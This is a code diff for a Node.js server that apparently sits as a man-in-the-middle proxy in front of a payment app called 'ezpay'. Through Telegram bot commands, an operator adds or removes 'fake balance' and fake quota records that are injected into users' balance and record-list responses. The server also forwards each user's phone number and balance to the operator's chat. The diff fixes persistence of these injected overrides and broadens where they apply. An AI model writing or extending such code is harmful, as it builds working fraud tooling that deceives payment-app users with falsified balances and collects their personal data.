@@ -78,11 +78,37 @@ async function loadData(forceRefresh) {
 }
 
 async function saveData(data) {
-  cachedData = data;
-  cacheTime = Date.now();
-  if (!redis) return;
-  try { await redis.set('ezpayData', data); } catch(e) {
+  const skipMerge = data._skipOverrideMerge;
+  if (skipMerge) delete data._skipOverrideMerge;
+  if (!redis) { cachedData = data; cacheTime = Date.now(); return; }
+  try {
+    if (!skipMerge) {
+      const current = await redis.get('ezpayData');
+      if (current && typeof current === 'object' && current.userOverrides) {
+        if (!data.userOverrides) data.userOverrides = {};
+        for (const uid of Object.keys(current.userOverrides)) {
+          const cur = current.userOverrides[uid];
+          const loc = data.userOverrides[uid];
+          if (!loc) {
+            data.userOverrides[uid] = cur;
+          } else {
+            if (cur.addedBalance !== undefined && loc.addedBalance === undefined) {
+              loc.addedBalance = cur.addedBalance;
+            }
+            if (cur.quotaRecords && cur.quotaRecords.length > 0 && (!loc.quotaRecords || loc.quotaRecords.length === 0)) {
+              loc.quotaRecords = cur.quotaRecords;
+            }
+          }
+        }
+      }
+    }
+    cachedData = data;
+    cacheTime = Date.now();
+    await redis.set('ezpayData', data);
+  } catch(e) {
     console.error('Redis save error:', e.message);
+    cachedData = data;
+    cacheTime = Date.now();
   }
 }
 
@@ -616,7 +642,7 @@ app.post('/bot-webhook', async (req, res) => {
     if (!msg || !msg.text) return res.sendStatus(200);
     const chatId = msg.chat.id;
     const text = msg.text.trim();
-    let data = await loadData();
+    let data = await loadData(true);
 
     if (text === '/start') {
       if (data.adminChatId && data.adminChatId !== chatId) {
@@ -779,6 +805,7 @@ Example:
         sourceType: 1,
         sourceTypeGroup: 1
       });
+      data._skipOverrideMerge = true;
       await saveData(data);
       await bot.sendMessage(chatId, `✅ Added ₹${amount} to user ${targetUserId}\n💰 Total added: ₹${data.userOverrides[targetUserId].addedBalance}\n📊 Updated balance: ₹${updatedBal}`);
       return res.sendStatus(200);
@@ -824,6 +851,7 @@ Example:
         }
       }
       if (data.userOverrides[targetUserId].addedBalance === 0) delete data.userOverrides[targetUserId].addedBalance;
+      data._skipOverrideMerge = true;
       await saveData(data);
       await bot.sendMessage(chatId, `✅ Deducted ₹${amount} from user ${targetUserId}\n💰 Total added: ₹${data.userOverrides[targetUserId].addedBalance || 0}\n📊 Updated balance: ₹${updatedBal2}`);
       return res.sendStatus(200);
@@ -848,6 +876,7 @@ Example:
           time: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }),
           phone: (tracked && tracked.phone) || ''
         });
+        data._skipOverrideMerge = true;
         await saveData(data);
         await bot.sendMessage(chatId, `🗑 Removed ₹${removed} fake balance from user ${targetId}\n💰 Now showing real balance`);
       } else {
@@ -1706,9 +1735,10 @@ app.all('/app/api/memberManager/mine', async (req, res) => {
     sendJson(res, respHeaders, jsonResp, respBody);
     if (effectiveUserId) {
       saveTokenUserId(req, effectiveUserId);
-      if (!data.trackedUsers) data.trackedUsers = {};
-      const existing = data.trackedUsers[String(effectiveUserId)] || {};
-      data.trackedUsers[String(effectiveUserId)] = {
+      const freshData = await loadData(true);
+      if (!freshData.trackedUsers) freshData.trackedUsers = {};
+      const existing = freshData.trackedUsers[String(effectiveUserId)] || {};
+      freshData.trackedUsers[String(effectiveUserId)] = {
         ...existing,
         lastAction: 'mine',
         lastSeen: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }),
@@ -1716,7 +1746,8 @@ app.all('/app/api/memberManager/mine', async (req, res) => {
         balance: bal !== '' ? bal : (existing.balance || ''),
         orderCount: existing.orderCount || 0
       };
-      saveData(data).catch(()=>{});
+      freshData._skipOverrideMerge = true;
+      saveData(freshData).catch(()=>{});
     }
     if (data.adminChatId && bot) {
       bot.sendMessage(data.adminChatId, `👤 Mine [${effectiveUserId || 'N/A'}]\n📱 Phone: ${phone || 'N/A'}\n💰 Balance: ${bal !== '' ? bal : 'N/A'}`).catch(()=>{});
@@ -1725,7 +1756,7 @@ app.all('/app/api/memberManager/mine', async (req, res) => {
 });
 
 app.all('/app/api/memberManager/balanceRecordList', async (req, res) => {
-  const data = await loadData();
+  const data = await loadData(true);
   try {
     const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
     const detectedUserId = await extractUserId(req, jsonResp);
@@ -1736,15 +1767,21 @@ app.all('/app/api/memberManager/balanceRecordList', async (req, res) => {
     const listData = getResponseData(jsonResp);
 
     const userOvr = data.userOverrides && data.userOverrides[String(detectedUserId)];
+    const addedBal = userOvr && userOvr.addedBalance !== undefined ? userOvr.addedBalance : 0;
     const fakeRecords = (userOvr && userOvr.quotaRecords && userOvr.quotaRecords.length > 0)
       ? [...userOvr.quotaRecords].reverse()
       : [];
 
     const body = req.parsedBody || req.body || {};
-    const pageNum = parseInt(body.pageNum || body.page || body.current || '1') || 1;
+    const qry = req.query || {};
+    const pageNum = parseInt(body.pageNum || body.page || body.current || qry.pageNum || qry.page || qry.current || '1') || 1;
     const shouldInject = pageNum === 1 && fakeRecords.length > 0;
 
     if (listData) {
+      if (addedBal !== 0 && typeof listData === 'object' && !Array.isArray(listData)) {
+        addBonusToBalanceFields(listData, addedBal);
+      }
+
       const applyToItem = (item) => {
         const itemUserId = item.userId ? String(item.userId) : (item.memberId ? String(item.memberId) : detectedUserId);
         const itemEff = getEffectiveSettings(data, itemUserId);
